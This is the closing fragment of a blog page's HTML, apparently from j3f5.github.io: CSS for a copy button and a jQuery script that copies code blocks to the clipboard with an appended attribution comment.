12px;font-size:13px;font-weight:700;line-height:20px;color:#333;white-space:nowrap;vertical-align:middle;cursor:pointer;background-color:#eee;background-image:linear-gradient(#fcfcfc,#eee);border:1px solid #d5d5d5;border-radius:3px;user-select:none;outline:0}.highlight-wrap .copy-btn{transition:opacity .3s ease-in-out;opacity:0;padding:2px 6px;position:absolute;right:4px;top:8px;z-index:2}.highlight-wrap .copy-btn:focus,.highlight-wrap:hover .copy-btn{opacity:1}.highlight-wrap{position:relative}</style><script>addLoadEvent(()=>{$(".highlight").each(function(t,e){var n=$("<div>").addClass("highlight-wrap");$(e).after(n),n.append($("<button>").addClass("copy-btn").append("复制").on("click",function(t){var e=$(this).parent().find(".code")[0].innerText,n=(e+="\n/**\n* 感谢您复制代码，使用代码请注明引用出处\n* j3fffff @ https://j3f5.github.io\n*/",document.createElement("textarea")),e=(document.body.appendChild(n),n.style.position="absolute",n.style.top="0px",n.style.left="0px",n.value=e,n.select(),n.focus(),document.execCommand("copy"));document.body.removeChild(n),e?$(this).text("复制成功"):$(this).text("复制失败"),$(this).blur()})).on("mouseleave",function(t){var e=$(this).find(".copy-btn");setTimeout(function(){e.text("复制")},300)}).append(e)})})</script></body></html>